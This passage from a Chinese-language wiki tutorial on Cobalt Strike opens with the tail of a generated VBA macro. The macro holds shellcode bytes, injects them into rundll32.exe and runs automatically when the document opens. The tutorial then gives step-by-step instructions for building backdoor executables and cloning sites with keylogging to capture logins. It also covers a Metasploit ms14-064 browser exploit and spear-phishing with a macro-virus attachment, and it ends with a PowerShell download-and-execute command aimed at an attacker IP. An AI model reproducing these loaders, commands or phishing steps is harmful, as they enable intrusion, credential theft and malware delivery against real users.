class="line">-29,90,-101,121,69,-115,57,47,114,24,76,106,-65,17,87,127,-26,-5,-31,12,-25,66,95,-58,-6,68,-81,121,-102,-128,-48,-35,-15,-63,-79,-74,-121,-9,-14,-79, _</span><br><span class="line">62,0,85,115,101,114,45,65,103,101,110,116,58,32,77,111,122,105,108,108,97,47,53,46,48,32,40,99,111,109,112,97,116,105,98,108,101,59,32,77, _</span><br><span class="line">83,73,69,32,49,48,46,48,59,32,87,105,110,100,111,119,115,32,78,84,32,54,46,50,59,32,87,105,110,54,52,59,32,120,54,52,59,32,84,114, _</span><br><span class="line">105,100,101,110,116,47,54,46,48,59,32,65,118,97,110,116,32,66,114,111,119,115,101,114,41,13,10,0,-73,13,45,-79,112,-83,-23,-107,-3,-111,-103,89, _</span><br><span class="line">36,9,-76,-118,112,-67,-22,-128,44,-106,95,108,-37,-118,88,-92,7,106,51,114,-10,-13,47,43,46,90,-127,107,25,-25,-48,-10,41,-92,-2,52,47,46,17,44, _</span><br><span class="line">-32,103,-12,78,-62,4,-125,74,-111,117,55,-95,-86,-80,-26,6,-70,-21,-106,49,-126,37,-124,-10,63,-6,104,-9,-24,-66,-47,-112,75,-32,-71,-91,55,-78,29,0, _</span><br><span class="line">125,2,39,-99,-9,46,-91,24,93,-72,68,-15,-77,-118,44,102,46,88,41,-4,104,67,-97,92,-13,-86,40,-30,0,122,-89,-63,-85,-117,-61,106,-28,75,-78,-85, _</span><br><span class="line">2,-107,80,34,-82,-33,-51,-48,-19,-64,30,23,-94,-112,-62,-30,68,-81,76,58,-41,48,31,-22,-82,-54,-58,71,63,127,-73,-45,-23,64,15,110,9,-94,-9,-38, _</span><br><span class="line">124,-29,64,-104,-11,64,-115,28,-61,87,68,-30,127,1,-95,67,-46,124,98,57,-120,-40,-113,42,-64,0,104,-16,-75,-94,86,-1,-43,106,64,104,0,16,0,0, _</span><br><span class="line">104,0,0,64,0,87,104,88,-92,83,-27,-1,-43,-109,-71,0,0,0,0,1,-39,81,83,-119,-25,87,104,0,32,0,0,83,86,104,18,-106,-119,-30,-1,-43, _</span><br><span class="line">-123,-64,116,-58,-117,7,1,-61,-123,-64,117,-27,88,-61,-24,-87,-3,-1,-1,49,48,46,50,53,49,46,48,46,51,53,0,25,105,-96,-115)</span><br><span class="line">    If Len(Environ(&quot;ProgramW6432&quot;)) &gt; 0 Then</span><br><span class="line">        sProc = Environ(&quot;windir&quot;) &amp; &quot;\\SysWOW64\\rundll32.exe&quot;</span><br><span class="line">    Else</span><br><span class="line">        sProc = Environ(&quot;windir&quot;) &amp; &quot;\\System32\\rundll32.exe&quot;</span><br><span class="line">    End If</span><br><span class="line"></span><br><span class="line">    res = RunStuff(sNull, sProc, ByVal 0&amp;, ByVal 0&amp;, ByVal 1&amp;, ByVal 4&amp;, ByVal 0&amp;, sNull, sInfo, pInfo)</span><br><span class="line"></span><br><span class="line">    rwxpage = AllocStuff(pInfo.hProcess, 0, UBound(myArray), &amp;H1000, &amp;H40)</span><br><span class="line">    For offset = LBound(myArray) To UBound(myArray)</span><br><span class="line">        myByte = myArray(offset)</span><br><span class="line">        res = WriteStuff(pInfo.hProcess, rwxpage + offset, myByte, 1, ByVal 0&amp;)</span><br><span class="line">    Next offset</span><br><span class="line">    res = CreateStuff(pInfo.hProcess, 0, 0, rwxpage, 0, 0, 0)</span><br><span class="line">End Sub</span><br><span class="line">Sub AutoOpen()</span><br><span class="line">    Auto_Open</span><br><span class="line">End Sub</span><br><span class="line">Sub Workbook_Open()</span><br><span class="line">    Auto_Open</span><br><span class="line">End Sub</span><br></pre></td></tr></table></figure><p>然后打开word编辑器，点击视图，然后点击宏，随便输入一个宏名，选择宏的位置，点击创建。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/33.png"></p><p>删除掉原来的代码，然后将复制的宏代码粘贴进去。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/34.png"></p><p>然后将文件另存为可启动宏的docm文件。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/35.png"></p><p>然后目标用户开启宏功能，主机就会成功在CS中上线。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/36.png"></p><p>查看宏功能开启情况可以在：文件–&gt;选线–&gt;信任中心–&gt;信任中心设置–&gt;宏设置。</p><p>打开该文件后，目标主机成功上线，进程名为rundll32.exe。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/37.png"></p><h4 id="3-3-3-Payload-Generator"><a href="#3-3-3-Payload-Generator" class="headerlink" title="3.3.3 Payload Generator"></a>3.3.3 Payload Generator</h4><p>这个模块主要用于各种语言版本的shellcode，然后通过其他语言进行编译生成。</p><p>点击Attacks–&gt;Packages–&gt;Payload Generator</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/38.png"></p><p>这里演示一下PowerShell和PowerShell Command的使用方法。</p><p><strong>PowerShell的使用方法</strong></p><p>先通过generate生成一个payload.ps1文件。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/39.png"></p><p>在目标机器上，powershell下执行如下命令，执行如下命令可以执行该脚本。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\payload.ps1</span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\payload.ps1</span><br></pre></td></tr></table></figure><p><strong>PowerShell Command的使用方法</strong></p><p>先通过generator生成payload.txt文件。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/40.png"></p><p>在目标机器上，powershell下执行该命令。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/41.png"></p><h4 id="3-3-4-Windows-Executable"><a href="#3-3-4-Windows-Executable" class="headerlink" title="3.3.4 Windows Executable"></a>3.3.4 Windows Executable</h4><p>点击Attacks–&gt;Packages–&gt;Windows Executable。选择相应的监听器，若目标操作系统是64位的话，可以选择勾选x64。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/42.png"></p><p>通过Generate生成exe可执行文件，保存到指定路径。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/43.png"></p><p>将生成的文件上传到目标机器并执行，即可成功上线。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/44.png"></p><h4 id="3-3-5-Windows-Executable（S）"><a href="#3-3-5-Windows-Executable（S）" class="headerlink" title="3.3.5 Windows Executable（S）"></a>3.3.5 Windows Executable（S）</h4><p>这里再详细介绍一下Windows Executable与Windows Executable（S）的差别。</p><p>这两个模块直接用于生成可执行的exe文件或dll文件。Windows Executable是生成Stager类型的马，而Windows Executable（S）是生成Stageless类型的马。那Stager和Stageless有什么区别呢？</p><ul><li>Stager是分阶段传送Payload。就是我们生成的Stager马其实是一个小程序，用于从服务器端下载我们真正的shellcode。分阶段在很多时候是很有必要的，因为很多场景对于能加载进内存并成功漏洞利用后执行的数据大小存在严格限制。所以这种时候，我们就不得不利用分阶段传送了。如果不需要分阶段的话，可以在C2的扩展文件里面把 host_stage选项设置为false。</li><li>而Stageless是完整的木马，后续不需要再向服务器端请求shellcode。所以使用这种方法生成的木马会比Stager生成的木马体积要大。但是这种木马有助于避免反溯源，因为如果开启了分阶段传送，任何人都能连接到你的C2服务器请求payload，并分析payload中的配置信息。在CobaltStrike4.0及以后的版本中，后渗透和横向移动绝大部分是使用的Stageless类型的木马。</li></ul><p>点击Attacks-&gt;Packages-&gt;Windows Executable。</p><p>选择对应的监听器和输出格式。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/45.png"></p><p>然后将生成的beacon.exe文件上传到目标机器上执行即可成功上线。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/46.png"></p><h3 id="3-4-用户驱动的Web交付攻击"><a href="#3-4-用户驱动的Web交付攻击" class="headerlink" title="3.4 用户驱动的Web交付攻击"></a>3.4 用户驱动的Web交付攻击</h3><p>用户驱动Web交付攻击User-Driven Web Drive-by Attacks功能打开位置：Attacks –&gt; Web Drive-by</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/25.png"></p><p>1、Java 签名 applet 攻击</p><p>java 签名 applet 攻击Java Signed Applet Attack会启动一个Web服务以提供自签名Java Applet的运行环境，浏览器会要求用户授予applet运行权限，如果用户同意则实现控制，但目前该攻击方法已过时。</p><p>2、Java 智能 Applet 攻击</p><p>Java 智能 Applet 攻击Java Smart Applet Attack会自动检测Java版本并利用已知的漏洞绕过安全沙箱，但CS官方称该攻击的实现已过时，在现在的环境中无效。</p><p>3、脚本化 Web 交付</p><p>脚本化 Web 交付Scripted Web Delivery 为payload提供web服务以便于下载和执行，类似于MSF的Script Web Delivery</p><p>4、托管文件</p><p>托管文件Host File通过Attacks –&gt; Web Drive-by –&gt; Host File进行配置，攻击者可以通过这个功能将文件上传到CS服务端上，从而进行文件托管。</p><p>如果想删除上传到CS服务端上的文件，可以到Attacks –&gt; Web Drive-by –&gt; Manage下进行删除。</p><p>如果想查看谁访问了这些文件，可以到View –&gt; Web Log下进行查看。</p><h3 id="3-5-钓鱼模块"><a href="#3-5-钓鱼模块" class="headerlink" title="3.5 钓鱼模块"></a>3.5 钓鱼模块</h3><h4 id="3-5-1-Manage"><a href="#3-5-1-Manage" class="headerlink" title="3.5.1 Manage"></a>3.5.1 Manage</h4><p>点击Attacks–&gt;Web Drive-by–&gt;Manage。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/47.png"></p><p>该模块可以查询CS服务端，现在能使用的模块代码。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/48.png"></p><h4 id="3-5-2-System-Profiler"><a href="#3-5-2-System-Profiler" class="headerlink" title="3.5.2 System Profiler"></a>3.5.2 System Profiler</h4><p>点击Attacks–&gt;Web Drive-by–&gt;System Profiler。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/20.png"></p><p>配置完后，当用户打开配置后的链接，我们可以在三个地方进行观察</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、View --&gt; Applications</span><br><span class="line">2、View --&gt; Web Log</span><br><span class="line">3、Cobalt Strike --&gt; Visualization --&gt; Target Table</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/21.png"></p><p>目标用户打开链接时，我们在CS上就能够看到目标使用的浏览器版本、系统版本等信息了，知道了版本信息，就能够进一步知道目标上可能存在什么漏洞。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/22.png"></p><p>注意的一点是如果 Cobalt Strike 的 web 服务器收到了lynx、wget 或 curl 的请求，CS会自动返回一个 404 页面，这样做是为了防御蓝队的窥探。</p><h4 id="3-5-3-Clone-Site"><a href="#3-5-3-Clone-Site" class="headerlink" title="3.5.3 Clone Site"></a>3.5.3 Clone Site</h4><p>点击Attacks–&gt;Web Drive-by–&gt;Clone Site。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/49.png"></p><p>填写需要克隆的网站url地址、本地的url地址、以及对应的端口号即可，这里记得要开启键盘记录。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/50.png"></p><p>点击Clone会生成一个链接。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/51.png"></p><p>访问此链接与克隆的网址完全一致。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/52.png"></p><p>将生成的链接发送给目标用户，若目标用户输入账号及密码进行登录，我们就可以在View–&gt;Web Log中得到用户输入的内容。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/53.png"></p><h4 id="3-5-4-Host-File"><a href="#3-5-4-Host-File" class="headerlink" title="3.5.4 Host File"></a>3.5.4 Host File</h4><p>点击Attacks–&gt;Web Drive-by–&gt;Host File。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/54.png"></p><p>上传文件artifact.exe，填入本地的URL、Host及端口即可。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/55.png"></p><p>点击launch生成下载链接。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/56.png"></p><p>将生成的下载链接发送给目标用户，若目标用户访问链接并运行了下载文件。目标主机就会成功上线。</p><h4 id="3-5-5-Clone-Site-Host-File"><a href="#3-5-5-Clone-Site-Host-File" class="headerlink" title="3.5.5 Clone Site + Host File"></a>3.5.5 Clone Site + Host File</h4><p>网站下载模块也可以与网站克隆模块进行组合使用，具体如下。</p><p>首先克隆一个网站，然后填入需要克隆的URL地址，然后在Attack中添加刚刚生成的下载链接即可。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/57.png"></p><p>点击Clone，会生成一个链接。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/58.png"></p><p>将生成的链接发送给目标用户，在目标用户访问时会提示是否下载qq.exe文件，当客户端下载并点击运行。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/59.png"></p><p>Cobalt Strike监听到有受害人主机就会成功上线。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/60.png"></p><h4 id="3-5-6-Clone-Site-MSF"><a href="#3-5-6-Clone-Site-MSF" class="headerlink" title="3.5.6 Clone Site + MSF"></a>3.5.6 Clone Site + MSF</h4><p>这里我们使用 metasploit中的ms14-064溢出漏洞与Cobalt Strik进行钓鱼攻击。具体步骤如下：</p><p>打开metasploit，使用ms14-064模块，并如下配置参数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/browser/ms14_064_ole_code_execution</span><br><span class="line">set SRVHOST 10.251.0.33</span><br><span class="line">set SRVPORT 8080</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 10.251.0.33</span><br><span class="line">set lport 6666</span><br><span class="line">exploit -j</span><br></pre></td></tr></table></figure><p>最后运行exploit -j，-j 是指作为job开始运行，即在后台运行。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/61.png"></p><p>打开CS中的Clone Site模块，输入需要克隆的网站地址及本地的URL等信息。然后在Attack中填入刚刚生成的溢出利用代码。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/62.png"></p><p>然后通过Clone生成一个链接，将链接发送给目标用户。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/63.png"></p><p>若目标用户使用IE浏览器访问链接，便会返回meterpreter通道。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/64.png"></p><h4 id="3-5-7-Spear-Phish"><a href="#3-5-7-Spear-Phish" class="headerlink" title="3.5.7 Spear Phish"></a>3.5.7 Spear Phish</h4><p>Spear Phish又叫鱼叉式网络钓鱼（Spear phishing）指一种源于亚洲与东欧只针对特定目标进行攻击的网络钓鱼攻击。</p><p>由于鱼叉式网络钓鱼锁定之对象并非一般个人，而是特定公司、组织成员，故受窃信息已非一般网络钓鱼所窃取之个人资料，而是其他高度敏感性资料，如知识产权及商业机密。</p><p>网络钓鱼是指诱导人们连接那些黑客已经锁定的目标。这种攻击方法的成功率很高，也非常常见。点击链接、打开表格或者连接其他一些文件都会感染病毒。一次简单的点击相当于为攻击者开启了一扇电子门，这样他就可以接触到你的内部弱点了。因为你已经同意他进入，他能够接触弱点，然后挖掘信息和授权连接。</p><p>用CS进行钓鱼需要四个步骤：</p><p>1、创建一个目标清单</p><p>2、制作一个邮件模板或者使用之前制作好的模板</p><p>3、选择一个用来发送邮件的邮件服务器</p><p>4、发送邮件</p><p>点击Attacks–&gt;Spear Phish。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/65.png"></p><p>下面简单介绍一下需要配置的一些参数。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/66.png"></p><p>targets是要发送邮箱地址的文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">123123@qq.com</span><br><span class="line">admin@qq.com</span><br><span class="line">admin@163.com</span><br></pre></td></tr></table></figure><p>template 是要发送邮件的模板，<strong>这个可以在个人邮箱中导出一个即可</strong></p><p>attachment 放入我们制作好的宏病毒</p><p>embed url 填写我们制作好的钓鱼网站</p><p>Mail Server 填写本地搭建或者网上公开使用的smtp服务器</p><p>Bounce To 模仿发件人，自己添写即可</p><p>首先先要创建一个文件，用于存放要进行钓鱼攻击的邮箱。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/67.png"></p><p>然后再看看怎么导出模板文件，具体步骤如下。</p><p>1.打开qq邮箱，选择需要导出的模板文件，这里我以<strong>【X情报社区】积分即将下线提醒</strong>的邮件为例。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/68.png"></p><p>2.选择导出为eml文件。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/69.png"></p><p>3.然后将导出的文件保存到指定路径即可。</p><p>4.开启SMTP服务器</p><p>再导出模板文件以后，我们需要先开启SMTP服务器，这里以网易邮箱为例。在<a href="https://mail.163.com/%E6%B3%A8%E5%86%8C%E4%B8%80%E4%B8%AA163%E9%82%AE%E7%AE%B1%E3%80%82">https://mail.163.com/注册一个163邮箱。</a></p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/70.png"></p><p>登陆邮箱，开启smtp服务。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/75.png"></p><p>在开启smtp服务时，系统会要求你发送一条短信。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/76.png"></p><p>在发送完短信以后，系统会给我们一个授权密码，用于在第三方服务器上使用smtp服务。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/77.png"></p><p>最后通过Clone Site创建一个钓鱼网站，进行钓鱼攻击，这里以克隆tom邮箱为例。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/78.png"></p><p>准备就绪，现在开始制作钓鱼邮件，填入需要进行填写的内容。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/79.png"></p><p>查看send email，可以发现邮件成功发送。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/80.png"></p><p>这时候打开邮箱，也可以看到成功收到了邮件。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/81.png"></p><p>这时候若目标用户下载附件并打开，且在office开启了宏功能。主机就会成功上线。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/82.png"></p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/83.png"></p><p>在用户点击任意链接后，就会跳转到我们所创建的钓鱼网站，并会提示是否下载qq.exe。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/84.png"></p><p>若用户点击保存并运行，主机也会成功上线。而且如果目标主机在登陆框中输入了用户名密码，输入的内容也将被我们所得到。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/85.png"></p><h4 id="3-5-8-Scripted-Web-Delivery（S）"><a href="#3-5-8-Scripted-Web-Delivery（S）" class="headerlink" title="3.5.8 Scripted Web Delivery（S）"></a>3.5.8 Scripted Web Delivery（S）</h4><p>点击Attacks–&gt;Web Drive-by–&gt;Scripted Web Delivery（S）</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/71.png"></p><p>设置监听器，选择需要使用的payload类型，这里以powershell为例。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/72.png"></p><p>点击Launch后，会生成一段powershell利用代码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://10.251.0.35:80/a&#x27;))&quot;</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/73.png"></p><p>在目标机器上执行这段代码，就会从服务器上下载后门文件，主机就会成功上线。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/74.png"></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><blockquote><ul><li><a href="https://teamssix.com/year/201023-192553.html">https://teamssix.com/year/201023-192553.html</a></li><li><a href="https://xz.aliyun.com/t/3975">https://xz.aliyun.com/t/3975</a></li><li><a href="https://payloads.online/tools/socat">https://payloads.online/tools/socat</a></li><li><a href="https://zhuanlan.zhihu.com/p/93718885">https://zhuanlan.zhihu.com/p/93718885</a></li><li><a href="https://www.anquanke.com/post/id/156299">https://www.anquanke.com/post/id/156299</a></li><li><a href="https://www.bilibili.com/video/BV16b411i7n5">https://www.bilibili.com/video/BV16b411i7n5</a></li><li><a href="https://www.freebuf.com/sectool/173366.html">https://www.freebuf.com/sectool/173366.html</a></li><li><a href="https://my.oschina.net/u/4300698/blog/3382230">https://my.oschina.net/u/4300698/blog/3382230</a></li><li><a href="https://segmentfault.com/a/1190000019290085">https://segmentfault.com/a/1190000019290085</a></li><li><a href="https://www.cnblogs.com/cthon/p/9151467.html">https://www.cnblogs.com/cthon/p/9151467.html</a></li><li><a href="https://www.secpulse.com/archives/127186.html">https://www.secpulse.com/archives/127186.html</a></li><li><a href="https://www.freebuf.com/articles/web/231892.html">https://www.freebuf.com/articles/web/231892.html</a></li><li><a href="https://klionsec.github.io/2017/09/23/cobalt-strike/">https://klionsec.github.io/2017/09/23/cobalt-strike/</a></li><li><a href="https://www.renfei.org/blog/introduction-to-spf.html">https://www.renfei.org/blog/introduction-to-spf.html</a></li><li><a href="https://www.cnblogs.com/backlion/p/10616308.html">https://www.cnblogs.com/backlion/p/10616308.html</a></li><li><a 